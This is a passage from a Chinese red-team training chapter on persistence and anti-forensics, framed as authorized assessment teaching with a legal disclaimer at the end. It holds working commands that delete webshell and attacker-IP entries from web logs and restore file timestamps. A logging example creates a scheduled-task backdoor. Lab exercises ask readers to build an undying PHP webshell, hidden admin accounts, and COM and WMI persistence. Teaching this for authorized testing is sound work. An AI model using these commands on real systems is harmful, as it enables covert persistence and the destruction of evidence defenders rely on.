rm -f /tmp/.ssh-* /tmp/.X*-lock

# === 时间戳恢复 ===
# 恢复被修改文件的时间戳（从备份）
touch -r /etc/passwd /tmp/important_file
```

3. **Web 日志清理**

```bash
# 删除 WebShell 访问记录
WEB_SHELL="shell.php"
for log in /var/log/apache2/access.log /var/log/nginx/access.log; do
    [ -f "$log" ] && sed -i "/$WEB_SHELL/d" "$log"
    [ -f "$log" ] && sed -i "/$ATTACKER_IP/d" "$log"
done

# 删除 WebShell 文件本身
rm -f /var/www/html/config.php /var/www/html/.cache/sess_*.php
```

4. **验证清理效果**

```powershell
# Windows 验证
# 1. 检查事件日志中是否还有攻击痕迹
Get-WinEvent -LogName Security -MaxEvents 100 | Where-Object {$_.Message -like "*10.0.0.100*"}

# 2. 检查维持点是否已删除
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
schtasks /query | findstr "Update"

# 3. 检查文件是否已删除
Test-Path C:\Windows\Temp\payload.exe
```

5. **生成清理报告**

```python
# cleanup_report.py
import json
from datetime import datetime

report = {
    "cleanup_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    "operator": "RedTeam-Alice",
    "target": "192.168.1.0/24",
    "cleaned_items": [
        {"type": "持久化后门", "count": 5, "details": "计划任务×2, 服务×1, 注册表×1, WMI×1"},
        {"type": "上传工具", "count": 8, "details": "Mimikatz, SharPersist, payload.exe 等"},
        {"type": "日志清理", "count": 12, "details": "Security, System, PowerShell, Apache access"},
        {"type": "后门账户", "count": 2, "details": "hacker$, svc_health"},
        {"type": "横向移动凭据", "count": 5, "details": "已安全销毁"},
    ],
    "verification": "全部清理项已验证，无残留痕迹",
    "notes": " krbtgt 密码建议客户在一周内重置两次"
}

with open("cleanup_report.json", "w") as f:
    json.dump(report, f, indent=2, ensure_ascii=False)

print("[+] 清理报告已生成: cleanup_report.json")
```

**结果**：成功清理所有攻击痕迹，蓝队排查未发现攻击路径。

**关键收获**：
- 定向清理优于全删，避免触发告警
- Linux 二进制日志（wtmp/btmp）需专用工具
- 时间戳恢复是反取证的关键
- 必须生成清理报告，证明评估合规

---

### 案例 5：红队操作安全规范

**背景**：某红队在一次护网行动中因操作不规范，导致客户业务系统异常与数据泄露，被追究责任。本案例复盘问题并总结规范。

**问题事件**：

1. **越权操作**：红队超出授权范围，对未授权的生产数据库执行了 `DROP TABLE`
2. **未清理后门**：评估结束后未清理 WebShell，被黑客利用发起二次攻击
3. **数据泄露**：红队下载的数据库备份存放在公共云盘，被第三方获取
4. **操作无记录**：无法回溯具体操作，无法证明合规性
5. **未及时通报**：发现高危漏洞未及时通报客户，导致被利用

**规范改进方案**：

1. **建立操作 SOP（标准作业程序）**

```markdown
## 红队操作 SOP

### 行动前
- [ ] 确认授权书范围、时间窗口、紧急联系人
- [ ] 准备专用测试环境与隔离网络
- [ ] 配置操作记录自动化（脚本记录所有命令）
- [ ] 准备清理预案

### 行动中
- [ ] 每次操作前确认在授权范围内
- [ ] 高危操作（删除、修改）前先备份
- [ ] 发现高危漏洞 2 小时内通报
- [ ] 实时记录操作日志（时间、目标、命令、影响）
- [ ] 不下载非必要的业务数据

### 行动后
- [ ] 按清单逐项清理所有后门
- [ ] 销毁所有获取的数据（ shred + 记录销毁过程）
- [ ] 生成评估报告与清理报告
- [ ] 与客户确认清理完成
- [ ] 复盘总结
```

2. **操作记录自动化**

```python
# auto_log.py —— 自动记录所有红队操作
import subprocess
import logging
from datetime import datetime
import socket
import getpass

logging.basicConfig(
    filename='/RedTeam/logs/operations.log',
    level=logging.INFO,
    format='%(asctime)s | %(message)s'
)

def log_command(cmd, target, impact=""):
    """记录命令执行"""
    user = getpass.getuser()
    host = socket.gethostname()
    logging.info(f"[{user}@{host}] TARGET={target} CMD={cmd} IMPACT={impact}")

def execute_with_log(cmd, target, impact=""):
    """执行命令并记录"""
    log_command(cmd, target, impact)
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    logging.info(f"RESULT: {result.stdout[:200]}")
    return result

# 使用示例
execute_with_log(
    "schtasks /create /tn WindowsUpdate /tr C:\\payload.exe /sc onlogon",
    "192.168.1.10",
    "创建计划任务持久化后门"
)
```

3. **数据安全管理**

```python
# data_manager.py —— 红队获取数据的安全管理
import os
import hashlib
from cryptography.fernet import Fernet

class SecureDataManager:
    def __init__(self, key=None):
        self.key = key or Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.inventory_file = "/RedTeam/data/inventory.txt"
    
    def store(self, data, source, sensitivity):
        """加密存储获取的数据"""
        encrypted = self.cipher.encrypt(data.encode())
        data_hash = hashlib.sha256(data.encode()).hexdigest()
        
        filename = f"/RedTeam/data/{data_hash}.enc"
        with open(filename, "wb") as f:
            f.write(encrypted)
        
        # 记录数据清单
        with open(self.inventory_file, "a") as f:
            f.write(f"{filename}|{source}|{sensitivity}|{data_hash}\n")
        
        return filename
    
    def secure_delete(self, filename):
        """安全销毁数据"""
        with open(filename, "rb") as f:
            data = f.read()
        # 多次覆写
        for _ in range(5):
            with open(filename, "wb") as f:
                f.write(os.urandom(len(data)))
        os.remove(filename)
        # 从清单删除
        # ...
```

4. **清理检查清单**

```python
# cleanup_checklist.py —— 清理完成度检查
checklist = {
    "Windows": [
        ("删除所有计划任务后门", "schtasks /query | findstr Update"),
        ("删除所有服务后门", "sc query | findstr evil"),
        ("删除注册表 Run 键", 'reg query "HKLM\\...\\Run"'),
        ("删除 WMI 事件订阅", "Get-WmiObject -Namespace root\\subscription"),
        ("删除上传的工具", "Test-Path C:\\Windows\\Temp\\payload.exe"),
        ("恢复审计策略", "auditpol /get /category:*"),
        ("清理事件日志", "wevtutil el | findstr evil"),
    ],
    "Linux": [
        ("删除 Cron 后门", "crontab -l"),
        ("删除 SSH 后门", "cat ~/.ssh/authorized_keys"),
        ("清理 bash 历史", "cat ~/.bash_history"),
        ("清理 wtmp/btmp", "utmpdump /var/log/wtmp"),
        ("删除上传工具", "ls -la /tmp/."),
    ],
    "Domain": [
        ("删除后门账户", "Get-ADUser svc_health"),
        ("清理 AdminSDHolder ACL", "Get-ADPermission AdminSDHolder"),
        ("重置 krbtgt（两次）", "Get-ADUser krbtgt -Properties pwdLastSet"),
        ("删除委派配置", "Get-ADComputer -Properties msDS-AllowedToDelegateTo"),
    ],
    "Web": [
        ("删除 WebShell", "find /var/www -name '*.php' -newer /tmp/marker"),
        ("清理 Web 日志", "grep -r 'shell.php' /var/log/"),
    ]
}

for category, items in checklist.items():
    print(f"\n=== {category} 清理检查 ===")
    for desc, check_cmd in items:
        print(f"[ ] {desc}")
        print(f"    验证: {check_cmd}")
```

**结果**：通过建立完善的操作规范，后续红队评估未再出现合规问题。

**关键收获**：
- 红队评估的核心是"可解释、可回溯、可清理"
- 操作记录自动化是合规的基础
- 数据安全管理与销毁必须规范
- 清理检查清单确保无遗漏
- 发现高危漏洞必须及时通报

---

## 习题

### 一、选择题（10 道）

1. 下列 Windows 权限维持技术中，**不需要管理员权限**即可实施的是？
   - A. 创建系统服务
   - B. 修改 HKLM 的 Run 键
   - C. 修改 HKCU 的 Run 键
   - D. 创建驱动

2. **WMI 事件订阅**作为权限维持方式的最大优势是？
   - A. 触发频率高
   - B. 不落地文件、不写注册表，隐蔽性极高
   - C. 可以提权到 SYSTEM
   - D. 不需要任何权限

3. 下列关于**黄金票据**的描述，错误的是？
   - A. 需要 krbtgt 账户的 NTLM Hash
   - B. 可伪造任意域用户身份
   - C. 重置所有用户密码即可使黄金票据失效
   - D. 默认有效期可达 10 年

4. **COM 劫持**通过在 HKCU 注册与 HKLM 相同的 CLSID 实现覆盖，其原理基于？
   - A. HKCU 优先级高于 HKLM
   - B. COM 组件会优先从 HKCU 加载
   - C. HKLM 的权限被篡改
   - D. COM 服务自动同步两个位置

5. **DCShadow** 攻击的核心特点是？
   - A. 从域控复制数据
   - B. 将攻击者机器伪装成域控，向真实域控推送恶意数据
   - C. 禁用域控的审计日志
   - D. 修改域控的 NTDS.dit 文件

6. 下列日志清理方式中，**最不容易被检测**的是？
   - A. 清空所有事件日志
   - B. 删除 evtx 文件
   - C. 定向删除特定事件 ID 的日志
   - D. 停止日志服务

7. **不死马（内存马）**能够持续重生的核心机制是？
   - A. 利用 rootkit 技术
   - B. 通过循环不断重新创建自身文件
   - C. 注入到内核进程
   - D. 修改系统启动项

8. **DSRM 后门**是域控的哪个账户？
   - A. Administrator（域管理员）
   - B. krbtgt
   - C. 域控的本地管理员账户
   - D. Guest

9. 关于红队评估结束后的清理，下列做法**不正确**的是？
   - A. 按清单逐项清理所有后门
   - B. 保留部分后门以备后续测试
   - C. 重置 krbtgt 密码（两次）
   - D. 生成清理报告并交付客户

10. **Timestomp** 反取证技术的主要作用是？
    - A. 加密文件内容
    - B. 篡改文件的创建、修改、访问时间
    - C. 删除文件元数据
    - D. 修改文件权限

### 二、填空题（5 道）

1. Windows 注册表中最经典的权限维持位置是 ________ 键，该键值中的程序会在用户登录时自动执行。系统级位置写作 `HKLM\Software\Microsoft\Windows\CurrentVersion\________`。

2. 域环境中，黄金票据使用 ________ 账户的 Hash 签发 TGT，而白银票据使用 ________ 账户的 Hash 直接签发 TGS 票据，后者不与域控通信，更隐蔽。

3. Skeleton Key 攻击通过在域控的 ________ 进程中注入万能密码，使所有账户都能用固定密码 `________` 登录域。

4. Linux 中记录当前在线用户的二进制日志文件是 ________，记录历史登录的是 ________，清理这些二进制日志需使用 ________ 等专用工具。

5. 红队痕迹清理的核心原则是"________ 而非全删"，因为清空全部日志会触发安全告警，反而暴露攻击者存在。

### 三、简答题（3 道）

1. 简述 Windows 权限维持中"主动触发型"与"被动触发型"的区别，并各举 3 个例子说明适用场景。

2. 描述域环境下 4 种典型权限维持技术（黄金票据、Skeleton Key、AdminSDHolder、DCShadow）的原理、前提条件与检测/防御方法。

3. 红队评估结束后的痕迹清理应遵循哪些原则？请从"清理目标、清理方法、验证机制、合规要求"四个方面详细说明。

### 四、实操题（2 道）

1. **Windows 多层权限维持实验**

   要求：
   - 在 Windows 虚拟机中（建议 Win10/2019）完成以下操作
   - 功能：
     - 使用 PowerShell 创建一个计划任务（登录触发，SYSTEM 权限）
     - 实现 COM 劫持（劫持一个系统 COM 组件）
     - 部署 WMI 事件订阅（系统启动 5 分钟后触发）
     - 创建隐藏账户 `test$` 并加入管理员组
   - 验证：重启后检查各维持点是否生效
   - 清理：编写 PowerShell 脚本，一键清理所有维持点并验证

   提示：
   - 计划任务用 `Register-ScheduledTask`
   - COM 劫持注意 ThreadingModel 设为 Apartment
   - WMI 需在 `root\subscription` 命名空间操作
   - 隐藏账户在 `net user` 中不显示，但"计算机管理"可见

2. **WebShell 不死马与清理实验**

   要求：
   - 在 Linux 虚拟机中搭建 Apache+PHP 环境
   - 功能：
     - 编写一个 PHP 不死马（循环重生机制，自身文件删除后仍持续运行）
     - 实现基于 `auto_prepend_file` 的内存马
     - 编写 Python 客户端连接工具（支持 AES 加密通信）
     - 测试删除 WebShell 文件后，不死马是否自动恢复
   - 清理：
     - 编写清理脚本，找出并彻底清除不死马进程
     - 清理 Apache 访问日志中 WebShell 相关记录
     - 恢复 php.ini / .user.ini 原始配置

   提示：
   - 不死马使用 `ignore_user_abort(true)` 和 `set_time_limit(0)`
   - 内存马修改 `auto_prepend_file` 指向恶意 PHP
   - 清理需使用 `ps aux | grep php` 找出进程并 kill
   - 日志清理用 `sed -i '/shell/d'` 定向删除

---

## 📝 本章小结

- **权限维持是红队攻击链的核心环节**，其本质是建立"复活点"，确保权限丢失后能重新获取。维持技术按触发方式分为主动触发型、被动触发型与常驻型，按权限层级分为用户级、系统级、域级与固件级。

- **Windows 系统提供了丰富的维持攻击面**，包括 20 种以上技术：注册表 Run 键、启动文件夹、计划任务、系统服务、驱动、WMI 事件订阅、COM 劫持、映像劫持、SSP、隐藏账户等。其中 COM 劫持与 WMI 事件订阅隐蔽性最高。

- **后门技术分为 Web、系统、账号三类**：Web 后门以不死马与内存马为代表；系统后门包括 SSH 软链接、PAM 后门、Cron 后门；账号后门包括 Windows 隐藏账户、RID 劫持、Linux UID=0 账户。

- **域环境维持是红队的"终极手段"**：黄金票据、白银票据、Skeleton Key、DSRM、DCShadow、AdminSDHolder、SID History、委派后门等技术，即使重装单台机器也无法清除，需系统性防御。

- **痕迹清理是红队操作规范的关键**：遵循"定向清理而非全删"原则，覆盖日志、文件、注册表、网络、操作痕迹与取证痕迹。反取证技术（Timestomp、日志伪造、数据销毁）进一步阻碍溯源。

- **红队操作必须合规**：授权范围内操作、全程可回溯、行动后彻底清理、数据安全销毁、及时通报高危漏洞。这不仅是法律要求，更是专业红队的职业底线。

---

## 🔗 相关链接

- [⬅️ 上一章：第73章 红队工具链与武器化](/redteam/day080-expert-红队工具链与武器化)
- [➡️ 下一章：---](/redteam/day082-expert-红队报告撰写)
- [📖 返回全书目录](/redteam/day118-toc-全书目录)

## 法律免责声明

> ⚠️ **重要声明**
>
> 本章所有内容仅用于**授权的红队安全评估、安全研究与教学目的**。文中介绍的工具、技术与攻击手法，必须在**获得目标所有者书面授权**的前提下使用。
>
> **未经授权**对任何计算机信息系统进行渗透测试、漏洞利用、数据获取、权限维持、痕迹清理等行为，均违反《中华人民共和国网络安全法》《中华人民共和国数据安全法》《中华人民共和国个人信息保护法》《中华人民共和国刑法》（第 285 条、第 286 条、第 286 条之二、第 285 条之三）等相关法律法规，可能构成：
> - 非法侵入计算机信息系统罪
> - 非法获取计算机信息系统数据罪
> - 非法控制计算机信息系统罪
> - 破坏计算机信息系统罪
> - 提供侵入、非法控制计算机信息系统程序、工具罪
>
> 上述犯罪最高可判处**七年以上有期徒刑**，并处罚金。
>
> 读者应当：
> 1. 仅在合法授权的范围内使用所学知识
> 2. 在自建靶场或获得授权的环境中练习
> 3. 遵守所在国家/地区的网络安全法律法规
> 4. 不得将本章技术用于任何非法用途
> 5. 红队评估结束后必须彻底清理所有后门与痕迹
> 6. 不得保留任何未授权的访问通道
>
> 作者与出版方对读者滥用本章内容所导致的任何法律后果**不承担任何责任**。读者需自行承担因不当使用本章内容而产生的一切法律责任。
>
> **请做一名合法、合规、负责任的安全从业者。**
